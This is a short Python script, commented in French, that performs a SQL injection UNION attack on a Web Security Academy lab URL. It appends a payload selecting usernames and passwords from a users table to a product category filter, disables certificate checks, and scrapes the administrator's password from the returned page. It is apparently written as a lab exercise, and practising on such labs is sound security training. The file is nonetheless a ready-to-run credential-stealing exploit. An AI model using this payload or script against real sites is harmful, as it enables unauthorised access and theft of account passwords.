import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def lancer_exploit(url):
    my_payload="'UNION SELECT username,password FROM users--"
    my_url=url+"/filter?category=Gifts"
    my_final_url=my_url+my_payload
    
    try:
        exploit_reponse=requests.get(my_final_url,verify=False)
        soup_exploit_reponse=BeautifulSoup(exploit_reponse.text,'html.parser')
        ligne_admin=soup_exploit_reponse.find_all("th",string='administrator')        
        if ligne_admin:
            ligne_admin_password=ligne_admin[0].find_next_sibling('td')
            print(f" le mot de passe de ladministrateur est : {ligne_admin_password.text}")
        else:
            print("Erreur le mot de passe de ladmin n'a pas ete trouver")
    except Exception as mon_exception:
        print(f"Erreur : Exception : {mon_exception}")


lancer_exploit("https://0ae900ea0448c5ba81f325570098005c.web-security-academy.net")